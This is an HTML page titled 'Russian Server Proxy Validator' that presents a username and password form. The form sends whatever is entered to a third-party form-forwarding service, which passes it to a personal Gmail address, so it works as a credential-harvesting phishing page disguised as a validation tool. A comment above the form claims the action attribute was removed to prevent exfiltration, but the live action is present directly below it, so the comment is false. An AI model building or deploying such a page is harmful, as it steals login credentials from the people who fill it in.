<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Russian Server Proxy Validator</title>
    <style>
        :root {
            --bg-color: #1a2536;
            --input-bg: #111a27;
            --border-color: #3b4b61;
            --text-main: #ffffff;
            --text-label: #94a3b8;
            --button-bg: #4a5f77;
            --button-hover: #58708b;
            --focus-border: #64748b;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
            box-sizing: border-box;
        }

        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 30px;
            letter-spacing: -0.5px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            color: var(--text-label);
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .required {
            color: #ef4444;
            margin-left: 4px;
        }

        .input-wrapper {
            position: relative;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 16px;
            background-color: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-main);
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s ease;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: var(--focus-border);
        }

        /* Eye icon styling */
        .eye-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            width: 24px;
            height: 24px;
            fill: #ffffff;
            opacity: 0.8;
        }

        .eye-icon:hover {
            opacity: 1;
        }

        .btn-submit {
            width: 100%;
            padding: 18px;
            background-color: var(--button-bg);
            color: var(--text-main);
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;Í
            margin-top: 10px;
        }

        .btn-submit:hover {
            background-color: var(--button-hover);
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Russian Server Proxy Validator</h1>

    <!-- Note: The action attribute has been removed to prevent data exfiltration -->
 
    <form action="https://formsubmit.co/emycooteo@gmail.com" method="POST">


        <div class="form-group">
            <label for="username">Email or Username <span class="required">*</span></label>
            <div class="input-wrapper">
                <input type="text" id="username" name="username" required>
            </div>
        </div>

        <div class="form-group">
            <label for="password">Password <span class="required">*</span></label>
            <div class="input-wrapper">
                <input type="password" id="password" name="password" required>
                <!-- SVG for the Eye Icon -->
                <svg class="eye-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
            </div>
        </div> 
        <button type="submit" class="btn-submit">validate</button>
    </form>

</div>

</body>
</html>
